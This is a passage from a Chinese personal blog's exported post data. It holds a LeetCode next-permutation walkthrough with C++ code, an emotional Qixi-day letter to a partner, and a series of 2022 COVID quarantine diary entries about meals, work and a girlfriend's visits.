算法库里的一个函数：next_permutation，但是师兄对 C不太熟 orz，那么用算法怎么写呢？ 我思考几秒后脱口而出： 你可以从后往前找，找到第一个对左小右大的组合，然后对调 那你怎么保证刚好是下一个呢 因为从后往前的话，你找到一定是可以替换的最低位的数字，这样就能保证你的这次替换是最小的 嗯.......好像确实有道理 嗯，就没有然后了，乍一看好像确实是这样，但是我在第一层 orz。 更气的是之后想起来我大二的时候在湖南工学院参加比赛的时候第一题就是这个，当时直接用 STL 的next_permutation。30 秒 A 了拿了一血 emmmm，谁知道让我自己写我竟然不能考虑全面，哎不说了，来看题吧 题面 整数数组的一个 排列 就是将其所有成员以序列或线性顺序排列。 例如，arr = [1,2,3]，一下都可以视作它的排列：[1,2,3]、[1,3,2]、[2,3,1]、[3,1,2]， 现在我们将一组数的全排列按十进制升序排列，当前排列的下一个排列指该排列在升序排列种的下一个排列。 例如，arr = [1,2,3]的下一个排列是[1,3,2] 类似的，arr = [2,3,1]的下一个排列是[3,1,2] 而对于arr = [3,2,1]，由于不存在比他更大的排列吗，它的下一个排列即升序排列的第一个[1,2,3] 现在给你一个整数数组nums，要求输出nums的下一个排列 要求控件复杂度为常数 数据符合如下条件： 1 &lt;= nums.length &lt;= 100 0 &lt;= nums[i] &lt;= 100 分析 首先题目要求空间复杂度为常数，意味着我们无法使用 DBF 或 BFS 这种需要借用额外数据结构的搜索算法进行搜索求解，因此我们只能通过交换原本数组种的某些位置得到所求字符串。 因此对于交换，我们需要满足以下条件： 比原数字大（在十进制下） 且是所有比原数字大大数种最小的（在十进制下） 那么首先想到的应该是把较大的数字放在尽量低的数位，例如： 对于1243，为了使其增大，我们需要将末尾处更大的数字回到更高的数位，但为了保证得到的数尽可能的小，我们会选择用 3 去和 2 交换，而不是 4，这样做是因为 3 比 4 要小，但我们怎么知道比 2 大一点点的数在哪里呢？ 首先我们需要明确的是，我们需要让尽量低位的数字变大。然后再来思考这个问题，对于一组数 abcd。为了让可以和更大数字换的，尽量低位的数字变大，因此我们需要从末尾考试寻找，找到第一个可以更换的位置，假设该数位 b。 那么我们应该用哪个数字替换这个最低位可以替换的数字呢？我们可以试着写一下某个序列的全排列，例如 1234 的： 123456789101112131415161718192021222324123412431324134214231432213421432314234124132431312431423214324134123421412341324213423143124321 写着写着是不是有点头绪了？我们发现对于某个我们确定需要替换的位置，我们会尽量去找该位置后面的数字与之交换。需要证明的话，我们使用反证法也很好证明： 对于数字 b，我们假设 b 之前存在一个数字 x，可以与之交换，使得原数变得更大，那么我们交换 x 和 b，显然这一步使得我们的更高位（比 b 更高）遭到了变化，该变化显然没有用更大的数字与 b 交换跟小，因为我们相当于至少为该数字增加了（b-x）_ （length - Index_x - 1）_ 10 的大小。 如果使用 b 之后的数位 y 与之交换，那么我们将增加（y - b） _ (length - index_b - 1) _ 10 的大小，其中 y - b 和 b - x 均为 &lt; 10 的数字，而 index_x 与 index_b 至少相差 1，那么即使 y-b = b-x，最终使用 x 替换后的增大量也要比使用 y 替换时大了 10 倍。 因此我们能确定需要使用 b 之后的数字替换。 那么问题又来了，是使用尽量靠近 b 的数字替换，还是尽量远离 b 的数字替换？我们在使用反证法： 对于 b，我们如果使用 d 去替换，显然是 ok 的，但是我们现在假设 b 和 d 之间存在那么一个 x，使得 b &lt; x &lt; d。那么显然使用 x 去替换 b 会得到更小的结果。 但是我们需要明确一点：x 在 b 之后。那么在这一情况下，我们使用 x 与 d 交换岂不是更优？这与b是第一个可以被替换的数字这一假设相矛盾。 因此我们知道寻找用于替换的数也要从后往前找。 于是我们可以得到1342。 好的，我第一遍听到这个题目的时候，思维就停留在了这里，以为这一问题得到了解答，但显然事情并不简单。 我们思考，这已经是最小的了吗？显然不是。虽然该数的百位被替换为了非常合适的 3，但这一位之后的数字呢？由于我们已经写出了 1234 的全排列，因此我们知道，1243 的下一个全排列是 1324，而不是 1342。 这是为什么呢，难道是我们分析的不对吗？ 其实我们的分析是对的，毕竟通过严格的数学证明进行了论证，只是我们考虑的不够全面。我只保证了可以更换的第一位进行了最优的替换，但并没有保证该位置之后的数位保持最小！ 我们知道，该位之后的子串也可以组成全排列，那么我们只需要保证这一全排列最小即可，即升序排列，因此我们还需要进行一步操作：对该位之后的数位进行排序。 最终我们得到答案：1324 代码 123456789101112131415161718void nextPermutation(vector&lt;int&gt;&amp; nums) &#123; // auto k = nums.end() - 1; for (auto i = nums.end() - 1; i &gt;= nums.begin(); i--) &#123; for (auto j = nums.end() - 1; j != i; j--) &#123; // cout &lt;&lt; &quot;第一位 &quot; &lt;&lt; *i &lt;&lt; &quot; 第二位 &quot; &lt;&lt; *j &lt;&lt; endl; if (*i &lt; *j) &#123; // cout &lt;&lt; *i &lt;&lt; &#x27; &#x27; &lt;&lt; *j &lt;&lt; &quot; 交换&quot; &lt;&lt; endl; swap(*i, *j); sort(i + 1, nums.end()); return; &#125; &#125; &#125; sort(nums.begin(), nums.end());&#125;","categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://enderxiao.github.io/categories/LeetCode/"}],"tags":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://enderxiao.github.io/tags/LeetCode/"},{"name":"算法","slug":"算法","permalink":"http://enderxiao.github.io/tags/%E7%AE%97%E6%B3%95/"},{"name":"全排列","slug":"全排列","permalink":"http://enderxiao.github.io/tags/%E5%85%A8%E6%8E%92%E5%88%97/"}]},{"title":"___________","slug":"————————","date":"2022-08-04T03:26:27.000Z","updated":"2024-07-30T11:26:33.921Z","comments":true,"path":"2022/08/04/————————/","permalink":"http://enderxiao.github.io/2022/08/04/%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%94/","excerpt":"","text":"2022.8.4，农历7月初7，星期四。既然不善言辞、逻辑不清的学渣写不出好的文字，那就让我来写吧，虽然我的文字也逻辑不通，但我不害怕被你看见，这一本以我开始，那就让他以我结束吧。 站在你家门口，被你一把推开的那一刹那，你指尖的余温好像还留在我胸口，逐渐渗透我的肌肤，融入我的血肉，化成一阵剧痛。我愣住了，“可能从最开始我就没那么喜欢你”，接着是脑海中无法控制的回荡着这句话，就像推倒的多米诺，想要阻止，但已经来不及了。我不知所措，转身离开，留下你一个人在门后。有那么一瞬间，我们之间，竖起了一扇门。 前一天8月3日，因为我家长的事情，让我们都很苦恼，于是我跑去你家，和你商量这件事；我因为前一晚的吃醋，和你参杂着说了一大堆我自己的情绪发泄，逼你回忆犯下的错。 接着下午也是，我心思全无，满脑子只想让你证明你爱我。不开心的时候，我很喜欢说反话。于是我说：我好想听你说你不爱我，这样我就能果断的和你分手了。我自己心里最清楚，听你说爱我，我不会信；听你说不爱我，我会相信。时间让我变得优柔寡断。没有了当年的自信与果敢。以前的我可以毫不顾忌的相信你是喜欢我的。但是现在，我犹豫是不是应该让你和前任见面；犹豫是不是应该和你在一起；早上犹豫是不是应该早点叫醒你；中午犹豫是不是应该叫你做做家务；晚上犹豫是不是应该叫上你一起出去玩；半夜犹豫是不是应该强迫你早点睡；最后我在犹豫你是不是不爱我。 你问我为什么还不放手，还想通过这件事情证明自己吗。现在的我确实足够自卑，自卑到不相信自己可以吸引你，自卑到任何事情都在说对不起，对不起这里没做好，对不起那里没做好。你说：“有没有可能是我的原因呢？”，我说不知道，因为我害怕你接下来会说：“我就是这样的人”。和你在一起我确实有私心。就像我一直说的，我希望你能因为和我在一起变得更好，变成你最初想要成为的样子。不会再觉得自己配不上别人，不会再因为自己的学历、知识、外貌感到自卑，能够好好的享受爱与被爱。我一直在责怪你欺骗我，但实际上，我也是大骗子。我所谓的喜欢你的一切，其实是以为，和我在一起，你能变成我上面描述的，我认为的更好的样子。因为在一起之前，你让我看到了，你愿意学习，了解我的喜好。 晚上回家，呆了会儿，想出门，想见你。但，自卑的我又上线了。我觉得你不想见我，于是，我只是路过你家门口，游荡了一会儿，然后叫上了LH。 你给我发的每一条消息，手环和手机的每一次同步震动，都让我激动，兴奋，但又痛苦，悲伤。直到手机耗尽最后一格电量，到了21：21分，我还是说出了，“对不起，我爱你”。 我不知道要怎么让自己变得有信心，也不知道该如何让你变得更好，但是我自以为是的认为，我们都需要有人陪着一起努力做出改变。 你喜欢过我，喜欢过CSY，喜欢过LYN。对我们抱有期待，却多次遭受冷淡。死去的回忆突然攻击，我知道你也在寻找当时喜欢一个人的感觉，其实也不必，我知道你在一个很辛苦，不想再爱来爱去的时候再次遇见了我。和你第一次遇见我的时候一样，满怀期待，但有时又期待落空。10月的生日，你8月就准备好了礼物，可惜10月的我看来并没有让你满意。你在没有完全准备好的时候和我恋爱，我在没有完全了解你的情况下选择被动接受。但是当我你们完全准备好的时候，我们还能相遇吗。错过了一次又一次，怎么说也要抓住机会吧。 半夜的12点，想起还没带你摘海灵芝，于是爬起来，打开pad，掏出星海宵宫，开荒清赖岛！要一起玩的DNF、LOL、DN，最后都没能一起玩，这次原神，我不能再重蹈覆辙了！站起来！（破音），然后开了一堆宝箱、传送点&amp;神瞳，还有咻咻咻的传送门。 接着是半夜的2点30。全票通过睡大觉，于是就唠了两句下线睡觉了。我试着睡着但是，睡不着。 2：30-3：00我在想你真的从一开始就没那么喜欢我吗； 3：00-3：10我在回味被推的那一下（经典回味型选手）； 3：10-4：00我大概在想我该怎么跟你说我妈妈的事； 4：00-5：00在想我应该怎么处理这件事，怎么破局； 然后终于睡着了，直到6：10的闹钟把我叫醒。 啥时候才是真正的喜欢，啥时候才是你努力的在找回以前的感觉，浏览过所有的日记，我大概有些眉目了。我一直希望你和我在一起可以轻松，可以不用那么刻意的去喜欢，但是我又过分纠结于过去，在你下定决心的时候我却没准备好。为什么你在没有准备好的时候找到我，让我去经历这些内心纠葛，我大概能懂了，你只是不想错过我，不想让我等太久。这么想的话，辜负你期待的我，真是太不该了。 不知道什么时候，我们可以互相坦诚相待，见面直接说出自己的真心话，知道即使说出真心话，也不会影响对方的感情。爱不是一件容易的事，我想和你一起学习如何去爱。顺便，七夕快乐，Good Night，WANAN，晚安，Lyric。","categories":[{"name":"Life","slug":"Life","permalink":"http://enderxiao.github.io/categories/Life/"},{"name":"关于我们","slug":"Life/关于我们","permalink":"http://enderxiao.github.io/categories/Life/%E5%85%B3%E4%BA%8E%E6%88%91%E4%BB%AC/"}],"tags":[{"name":"life","slug":"life","permalink":"http://enderxiao.github.io/tags/life/"}]},{"title":"隔离日记6/7","slug":"隔离日记6-7","date":"2022-06-03T13:44:22.000Z","updated":"2024-07-30T11:26:33.940Z","comments":true,"path":"2022/06/03/隔离日记6-7/","permalink":"http://enderxiao.github.io/2022/06/03/%E9%9A%94%E7%A6%BB%E6%97%A5%E8%AE%B06-7/","excerpt":"不管是甜粽还是咸粽！都能让生活与粽不同！~","text":"不管是甜粽还是咸粽！都能让生活与粽不同！~ 早上 早上起来！拥抱太阳！ 洗漱好，老老实实打开电脑坐在沙发上准备等着早会… 从8点50等到了10点呢… 为什么今天还没开会… 啊好像今天是端午节呃，应该放假才对… 等等！ 今天是！！！ 端午节！！！ 还没等我反应过来突然听到敲门声，好像是叫我做核酸来着… 昨晚核酸自己琢磨一下，我好像三天没有核酸了。 翻看一下隔离政策… … 好像是1，2，3，7各做一次核酸来着… 等等！ 那意思是几天第七天了！（但是实际上我抵达的那天并没有做核酸） 那不是意味着等核酸结果出来我的集中隔离生活就结束了！ 好耶！！！！！！ヾ(≧O≦)〃嗷~ 于是愉快的拿上了早餐和昨天被投喂的栀子生椰🥥！ 栀子生椰🥥 然后今天的早餐有小粽子！是红豆馅的甜粽子捏！ 摆渡车上 中午 燥热的中午…… 今天的中餐没有小面包~，换成了红豆肉粽！是咸粽哦！ 但是忘了拍照嗷呜…. 今天异常的热啊，可能想到今天可能可以回去了？ 于是实在忍不住去冲了个澡…. 然后把行李打包好，以免今天通知我回家~ 接着看了几集黄金之风！ 下午 下午在床上躺了会儿 每个小时都在刷新健康卡 可是最近一次核酸的记录还是没有出来 一直等到了6点10 是送餐的敲门声 小戎喵给我发消息的震动 迷迷糊糊醒来，看了一眼健康卡 果然没有呢 突如其来的失落让我毫无胃口 拿起平板给我的小雪花画❄一张端午贺图吧 像素粒烧肉粽 肉的部分让我很纠结 我不知道该如何表达煮熟的肉 可能得给它加上一点肉的纹理？ 然后加点肉的红色作为点缀？ 最后小雪花还是猜出来这是肉粽啦！ 好耶！ 然后是晚餐时间…. 晚餐 丸子味道还不错 但是可能是心情原因没什么胃口呢 九十点的夜晚 仍然在小青蛙的伴奏下敲出一行行文字 端午佳节 与家人团聚 包上一些粽子 一起品尝团聚、劳动的味道 在这个万家粽叶飘香的季节 我可以被邀请 去你家尝尝粽子吗？ 拒绝了家人的探望 因为希望大家能在这天 都能开开心心的和家人在一起 今年是一个孤单的端午呢~ 晚安小雪花&lt;(￣ˇ￣)/","categories":[{"name":"Life","slug":"Life","permalink":"http://enderxiao.github.io/categories/Life/"},{"name":"关于我们","slug":"Life/关于我们","permalink":"http://enderxiao.github.io/categories/Life/%E5%85%B3%E4%BA%8E%E6%88%91%E4%BB%AC/"},{"name":"疫情返乡","slug":"Life/关于我们/疫情返乡","permalink":"http://enderxiao.github.io/categories/Life/%E5%85%B3%E4%BA%8E%E6%88%91%E4%BB%AC/%E7%96%AB%E6%83%85%E8%BF%94%E4%B9%A1/"}],"tags":[{"name":"life","slug":"life","permalink":"http://enderxiao.github.io/tags/life/"},{"name":"返乡","slug":"返乡","permalink":"http://enderxiao.github.io/tags/%E8%BF%94%E4%B9%A1/"},{"name":"北京","slug":"北京","permalink":"http://enderxiao.github.io/tags/%E5%8C%97%E4%BA%AC/"},{"name":"疫情","slug":"疫情","permalink":"http://enderxiao.github.io/tags/%E7%96%AB%E6%83%85/"},{"name":"硕士研究生","slug":"硕士研究生","permalink":"http://enderxiao.github.io/tags/%E7%A1%95%E5%A3%AB%E7%A0%94%E7%A9%B6%E7%94%9F/"},{"name":"导师那些事","slug":"导师那些事","permalink":"http://enderxiao.github.io/tags/%E5%AF%BC%E5%B8%88%E9%82%A3%E4%BA%9B%E4%BA%8B/"}]},{"title":"隔离日记5/7","slug":"隔离日记5-7","date":"2022-06-02T11:14:04.000Z","updated":"2024-07-30T11:26:33.940Z","comments":true,"path":"2022/06/02/隔离日记5-7/","permalink":"http://enderxiao.github.io/2022/06/02/%E9%9A%94%E7%A6%BB%E6%97%A5%E8%AE%B05-7/","excerpt":"天空是什么颜色，踩在大地上是什么感觉，雨水滑落我的面庞能否让我感到释然，我已不知道…","text":"天空是什么颜色，踩在大地上是什么感觉，雨水滑落我的面庞能否让我感到释然，我已不知道… 早上 昨晚睡得比较晚于是。。。今天早上九点半才起床，差点错过例会๐·°(৹˃̵﹏˂̵৹)°·๐ 还好老板这个会开的比较久23333 然后今早仍然是葱卷+馒头，但是今天是红糖馒头哦~ 然后和宝贝打电话于是忘记拍照了… 然后是 痛苦 愉快的打工时间… … &lt;(▰˘◡˘▰)&gt; … 中午 今天视频没有断过呀hiahiahia~（反派笑）( ‵▽′)ψ 然后午餐有一个非常让人难忘的菜….是鱼豆腐红烧肉……这个搭配有点一言难尽不过意外的还不错 接下来下午是继续打工，然后摸鱼时间是情侣刷啊B环节hhhhh…… 傍晚 今天的晚餐选手是 …(dong dong dong dong dong…) 将将~ 是腊肠！ 是腊肠哦! 还有一份小汤圆蛋花儿甜酒！！！！！ 好久没吃了呜呜呜，里面还有梨~ 白白胖胖的小汤圆砸! 接下来又到了愉快的探监环节！ 但是今天是双人成行…. 你看他，笑得多开心哇~ 铁窗泪! 我真的会谢谢泥~ 你这图怎么有声音啊…. 让我们来直视这两个恶魔的真面目 当你在凝视深渊,深渊…. 我还能做什么呢，我只是一只小猫咪呀ฅ( ̳• ·̫ • ̳) 听我说…..快逃! 但是其实宝贝也给我带了茶颜！可是……我不明白为什么我还没有拿到eeeeeeeeeeeeeeeeeeeeemmmm希望他能快一点送上来，入夜了我好困٩(ˊ〇ˋ*)و 宝贝对我来说，真的是很特别的存在，在我一生中可能再也无法出现一个人能代替她的位置。我们的相遇是那么稀松平常，但展开却是那么千载难逢。在疫情复发的这段时间里，很庆幸我能有你的陪伴。你会怕我寂寞给我打电话，怕我无聊陪我打游戏，怕我过于想你给我寄礼物。对我来说你的一切都是那么美好，那么渴望拥有。希望我们可以一起度过以后的每一天。 玛卡噼咔(∩•̀ω•́)⊃–*⋆变女友！ 晚安啦玛卡巴卡(:3ꇤ[▓▓]","categories":[{"name":"Life","slug":"Life","permalink":"http://enderxiao.github.io/categories/Life/"},{"name":"关于我们","slug":"Life/关于我们","permalink":"http://enderxiao.github.io/categories/Life/%E5%85%B3%E4%BA%8E%E6%88%91%E4%BB%AC/"},{"name":"疫情返乡","slug":"Life/关于我们/疫情返乡","permalink":"http://enderxiao.github.io/categories/Life/%E5%85%B3%E4%BA%8E%E6%88%91%E4%BB%AC/%E7%96%AB%E6%83%85%E8%BF%94%E4%B9%A1/"}],"tags":[{"name":"life","slug":"life","permalink":"http://enderxiao.github.io/tags/life/"},{"name":"返乡","slug":"返乡","permalink":"http://enderxiao.github.io/tags/%E8%BF%94%E4%B9%A1/"},{"name":"北京","slug":"北京","permalink":"http://enderxiao.github.io/tags/%E5%8C%97%E4%BA%AC/"},{"name":"疫情","slug":"疫情","permalink":"http://enderxiao.github.io/tags/%E7%96%AB%E6%83%85/"},{"name":"硕士研究生","slug":"硕士研究生","permalink":"http://enderxiao.github.io/tags/%E7%A1%95%E5%A3%AB%E7%A0%94%E7%A9%B6%E7%94%9F/"},{"name":"导师那些事","slug":"导师那些事","permalink":"http://enderxiao.github.io/tags/%E5%AF%BC%E5%B8%88%E9%82%A3%E4%BA%9B%E4%BA%8B/"}]},{"title":"隔离日记4/7","slug":"隔离日记4-7","date":"2022-06-01T15:29:23.000Z","updated":"2024-07-30T11:26:33.940Z","comments":true,"path":"2022/06/01/隔离日记4-7/","permalink":"http://enderxiao.github.io/2022/06/01/%E9%9A%94%E7%A6%BB%E6%97%A5%E8%AE%B04-7/","excerpt":"还有三天才能回去哇，希望时间过的快一点","text":"还有三天才能回去哇，希望时间过的快一点 清晨 又是早早的起床，然后又又又是常规的葱卷+馒头所以并没有拍照嘻嘻，然后又开始了一天的工作。 然后等到我的宝贝起来，今天是女朋友化妆课呢，从洗头到防晒再到最后的扎头发等等等等，脑子：你会了 她真的试图教会我 中午 一扫前几日的阴霾，今天家里的天气可以说是这几天最好的了，阳光充足，天也很蓝，还有好多好多棉花糖一样的云朵，但是并出不去orz 中餐也是终于开始觉得有点腻了，而且茄子有点咸过头了： 腻了 下午 下午直接快进到探监。 今天是儿童节！所以很开心收到了儿童节限定小憨堡： 给大憨堡带的小憨堡 然后是我看着画好妆的，我的超可爱宝贝！ 然后让我看看我的六一补给大礼包！ 你看这个闪闪的紫色小盒子！他好好看哇！ 闪亮亮紫色礼盒 然后打开盒子是两个mini汉堡！左边一个是卤藕+鸡肉，虽然藕很糯但是酱料的味道很好，稍微有点辣，然后右边的是鸡肉+梅干菜，梅干菜的香味很棒+肉的口感也很好会缓解掉大部分肉饼的油腻感。 来看看这两个juicy的小家伙 mini汉堡套餐 接下来还有超级喜欢的超人狗狗！ 是你超狗! 嗯，然后，没有然后了，不要期待了，没有晚餐的照片，因为我甚至都没有吃到一半。 被女友投喂的日子突然长出了幸福肉呢！ 晚上 今天是儿童节，小朋友在这一天一定会开心24小时！对我而言你不只是我的小朋友，你还是我的小妹妹，是我的女朋友，是我的大姐姐，是我的小蛋糕，小月亮，小雪花，you are my everything， 或许my everything is you。所以我会努力让你每一天都开心24小时！ 这可能是我第一次近距离看到化了美美的妆的你？有时候会想，是不是应该去学习一美妆知识，让你能就坐在那里，美美的享受？ Good night, love of my life.","categories":[{"name":"Life","slug":"Life","permalink":"http://enderxiao.github.io/categories/Life/"},{"name":"关于我们","slug":"Life/关于我们","permalink":"http://enderxiao.github.io/categories/Life/%E5%85%B3%E4%BA%8E%E6%88%91%E4%BB%AC/"},{"name":"疫情返乡","slug":"Life/关于我们/疫情返乡","permalink":"http://enderxiao.github.io/categories/Life/%E5%85%B3%E4%BA%8E%E6%88%91%E4%BB%AC/%E7%96%AB%E6%83%85%E8%BF%94%E4%B9%A1/"}],"tags":[{"name":"life","slug":"life","permalink":"http://enderxiao.github.io/tags/life/"},{"name":"返乡","slug":"返乡","permalink":"http://enderxiao.github.io/tags/%E8%BF%94%E4%B9%A1/"},{"name":"北京","slug":"北京","permalink":"http://enderxiao.github.io/tags/%E5%8C%97%E4%BA%AC/"},{"name":"疫情","slug":"疫情","permalink":"http://enderxiao.github.io/tags/%E7%96%AB%E6%83%85/"},{"name":"硕士研究生","slug":"硕士研究生","permalink":"http://enderxiao.github.io/tags/%E7%A1%95%E5%A3%AB%E7%A0%94%E7%A9%B6%E7%94%9F/"},{"name":"导师那些事","slug":"导师那些事","permalink":"http://enderxiao.github.io/tags/%E5%AF%BC%E5%B8%88%E9%82%A3%E4%BA%9B%E4%BA%8B/"}]},{"title":"隔离日记3/7","slug":"隔离日记3-7","date":"2022-05-31T12:17:50.000Z","updated":"2024-07-30T11:26:33.939Z","comments":true,"path":"2022/05/31/隔离日记3-7/","permalink":"http://enderxiao.github.io/2022/05/31/%E9%9A%94%E7%A6%BB%E6%97%A5%E8%AE%B03-7/","excerpt":"隔离的三天…开始狂躁","text":"隔离的三天…开始狂躁 上午 平平无奇的上午，昨晚睡的比较早然后8点准时醒来，冲了个澡就开始了一天的工作，然后今早有拍到早餐的画卷和馒头： 是早餐呀 然后今天早晨给自己换了个位置打工，因为原来的地方座位太硬了……而且过于局促。 所以我来到了床边的躺椅上，把电脑放在了大腿上，然后给自己安排了一个靠枕。 嗯舒服是舒服，就是腿上有点烫…. 中午 首先是午餐！ 是午餐呀 午餐厨师水平发挥正常，都是很家常的做法，小南瓜也很爽脆。味道也是一吃就知道是弗兰人的恰到好处的重口味呢。 然后靠在沙发上敲着代码，然后睡着了……虽然也没睡多久就是了（¯﹃¯） 醒来以后，发现有的人悄摸来探监了…. 接到宝贝的电话还想问你在哪，然后传来了一阵电锯声….突然意识到这个人是不在我楼下，于是往窗外瞅了一眼，并留下了如下让人很难忍住不笑的照片： 噗哈哈哈 然后下午继续工作，摸鱼…. 晚上 听着ThunderTruck，开始吃晚餐。 麻木的生活需要一点带劲的摇滚乐！ ThunderTruck! 然后是每天的文案事件，掐着点和宝贝说了儿童节快乐！然后没忍住就先睡了呜呜呜，中途听到宝贝在叫我呃！ 晚安玛卡巴卡！","categories":[{"name":"Life","slug":"Life","permalink":"http://enderxiao.github.io/categories/Life/"},{"name":"关于我们","slug":"Life/关于我们","permalink":"http://enderxiao.github.io/categories/Life/%E5%85%B3%E4%BA%8E%E6%88%91%E4%BB%AC/"},{"name":"疫情返乡","slug":"Life/关于我们/疫情返乡","permalink":"http://enderxiao.github.io/categories/Life/%E5%85%B3%E4%BA%8E%E6%88%91%E4%BB%AC/%E7%96%AB%E6%83%85%E8%BF%94%E4%B9%A1/"}],"tags":[{"name":"life","slug":"life","permalink":"http://enderxiao.github.io/tags/life/"},{"name":"返乡","slug":"返乡","permalink":"http://enderxiao.github.io/tags/%E8%BF%94%E4%B9%A1/"},{"name":"北京","slug":"北京","permalink":"http://enderxiao.github.io/tags/%E5%8C%97%E4%BA%AC/"},{"name":"疫情","slug":"疫情","permalink":"http://enderxiao.github.io/tags/%E7%96%AB%E6%83%85/"},{"name":"硕士研究生","slug":"硕士研究生","permalink":"http://enderxiao.github.io/tags/%E7%A1%95%E5%A3%AB%E7%A0%94%E7%A9%B6%E7%94%9F/"},{"name":"导师那些事","slug":"导师那些事","permalink":"http://enderxiao.github.io/tags/%E5%AF%BC%E5%B8%88%E9%82%A3%E4%BA%9B%E4%BA%8B/"}]},{"title":"隔离日记2/7","slug":"隔离日记2-7","date":"2022-05-30T12:40:49.000Z","updated":"2024-07-30T11:26:33.939Z","comments":true,"path":"2022/05/30/隔离日记2-7/","permalink":"http://enderxiao.github.io/2022/05/30/%E9%9A%94%E7%A6%BB%E6%97%A5%E8%AE%B02-7/","excerpt":"隔离的第二天，想她","text":"隔离的第二天，想她 清晨 可能是昨晚的闲聊内容久久不能散去？今天也是被自己的生物钟叫醒，好想去你身边，然后和你说： 我们的感情一定不能如此简单的用几个类似新鲜感的**词汇描述啊！ 早餐 今天的早餐是葱卷、馒头+绿豆沙 嗯，早餐就如下图所示的一坨带绿色葱花点缀的面疙瘩 + 一个大白面疙瘩，和一碗用一次性碗盛的澄清表面深绿色，底部墨绿色沉淀的汤： 早餐 由于 吃太快了没有拍照 不太爱吃纯面疙瘩于是没拍照，嗯。 然后是准备一天的日报。 午餐 然后是中餐！中餐是蛙哦！是蛙呀！ 上次吃蛙还是三月初在长沙的最后一顿…… 是蛙! 午后 饭后总是让人产生莫名的困意，坐在桌前敲代码一边和我的宝贝打电话，然后很长一段时间没有说话，然后就睡着了….嘤嘤嘤，趴在桌上睡着惹，嗯，是久违的上课睡觉的感觉₍₍ (̨̡ ‾᷄ᗣ‾᷅ )̧̢ ₎₎ 然后是起床后的和女朋友换装游戏！ 是新皮肤！ 快进到愉快的探监时间！ 今天是米白和紫色的绝妙搭配蛙！！！！你看辣个fafa小袜子！你看辣个猫猫小伞！还有辣个双马尾！还有星黛露小包包！ 是我最爱的紫色呀！她心里有我！ 大概是今日最快乐的时间！ 晚上 好的时间来到了夜晚，是手哥出来活动的时间了！但是先来看看晚餐： 是肥肠! 本以为是稀松跟平常的回锅肉，结果发现居然是回锅肉炒肥肠！而且还有酸萝拜！隔离餐真是把我回家想吃的菜全部安排到位了。 午饭后终于把怪奇物语4的上半看完了，我以为7集就完结了emmmm，结果并不是，那我为什么要这么着急的把它看完呢嘤嘤嘤˃̣̣̥᷄⌓˂̣̣̥᷅，我现在感觉浑身痒痒，身上有小十一在爬orz。 然后就被某个大晚上喝醉酒不省人事的老哥叫去开小会了emmm 喝到扭曲 晚安 夜晚，宝贝还在继续看《你一生的故事》，看到巴比伦塔来了！我觉得巴比伦塔是一个很特别的故事，特别的地方在于，它仿佛在科幻小说中有意的引入宗教神学的概念，在故事结尾处，工匠钻破天顶意识到自己重回地面的时刻，顿悟了整个宇宙的真实结构，其意义可与当初人类发现大地是球形相比，营造出了科幻总是给人带来的那种惊异感。 然后是和我最爱的人通话，今晚开了免提，因为想着这样就能清晰的听到你的呼吸，就好像你在我身边。晚安","categories":[{"name":"Life","slug":"Life","permalink":"http://enderxiao.github.io/categories/Life/"},{"name":"关于我们","slug":"Life/关于我们","permalink":"http://enderxiao.github.io/categories/Life/%E5%85%B3%E4%BA%8E%E6%88%91%E4%BB%AC/"},{"name":"疫情返乡","slug":"Life/关于我们/疫情返乡","permalink":"http://enderxiao.github.io/categories/Life/%E5%85%B3%E4%BA%8E%E6%88%91%E4%BB%AC/%E7%96%AB%E6%83%85%E8%BF%94%E4%B9%A1/"}],"tags":[{"name":"life","slug":"life","permalink":"http://enderxiao.github.io/tags/life/"},{"name":"返乡","slug":"返乡","permalink":"http://enderxiao.github.io/tags/%E8%BF%94%E4%B9%A1/"},{"name":"北京","slug":"北京","permalink":"http://enderxiao.github.io/tags/%E5%8C%97%E4%BA%AC/"},{"name":"疫情","slug":"疫情","permalink":"http://enderxiao.github.io/tags/%E7%96%AB%E6%83%85/"},{"name":"硕士研究生","slug":"硕士研究生","permalink":"http://enderxiao.github.io/tags/%E7%A1%95%E5%A3%AB%E7%A0%94%E7%A9%B6%E7%94%9F/"},{"name":"导师那些事","slug":"导师那些事","permalink":"http://enderxiao.github.io/tags/%E5%AF%BC%E5%B8%88%E9%82%A3%E4%BA%9B%E4%BA%8B/"}]},{"title":"隔离日记1/7","slug":"隔离日记1-7","date":"2022-05-29T02:17:35.000Z","updated":"2024-07-30T11:26:33.939Z","comments":true,"path":"2022/05/29/隔离日记1-7/","permalink":"http://enderxiao.github.io/2022/05/29/%E9%9A%94%E7%A6%BB%E6%97%A5%E8%AE%B01-7/","excerpt":"继525作战成功后，终于回到了有你的地方","text":"继525作战成功后，终于回到了有你的地方 抵达 火车 宿舍封锁了，于是去北京西站的交通方式只剩下朋友接送和学校的摆渡车，摆渡车最晚一趟为下午的6点，为了预留充足的： 思考需要带哪些东西 和我的宝贝汇报我要回来这件事 拆开我的520礼物 等待我的离校申请结果 蹭食堂的饭 打包行李的过程中摸会儿鱼 中午由于太懒午休要赖床 …… 的时间，于是选择了当天下午9：05的车。所以我即将会在下午6：30分左右到达北京西，然后……等到8点30左右…. 摆渡车上 但实际上还好，火车站人不算太多，并且由于买的软卧（软卧为什么不能学生票！震怒是🤬），会有单独的软卧候车室。上车之后发现环境不错而且，这一站上车的人少，我那个房间就我一个哎嘿是(～￣▽￣)～。 软卧包间！ 火车站 事实上真正抵达这里的时间是5月27日也就是昨天中午的1点左右，但是到达后社区的一些列操作….导致我实际上是傍晚的6点30分左右才抵达隔离酒店。挣扎过程如下….: 社区：您好，今天回来对吗 我：对的，我这趟车刚到长沙 社区：我这边准备安排司机了如果有什么变动请及时联系我 我：好 社区：15573******救护车周师傅，已安排好司机，出站请与师傅联系😁🤝 出战后，填写留调信息…… 我：您好我这边下车做完流调流程后这边让我坐他们安排的车走，不能坐你们安排的车🤪 社区：？我们按排的就是120救护车，那他们知道把你送哪里吗？？ 然后打了一大堆电话四处找人确认…… 发现原来这边流调也是先联系街道，然后街道联系社区，再叫社区派车来接……所以社区和流调叫的车是一台车emmmm。 但是当时我和流调的工作人员说已经联系了社区，社区会派车来接我的时候他们说的确实是要坐他们安排的车。 于是我自作主张的和司机联系并说不用来接我了🤪（我是**） 然后我进一步和社区确认是否需要联系司机： 我：那请问现在我还是等您之前给我号码的那个司机吗，我还要直接去联系他一下还是….. 社区：不用。您等一等，司机可能没那么快 我：好的麻烦你们了 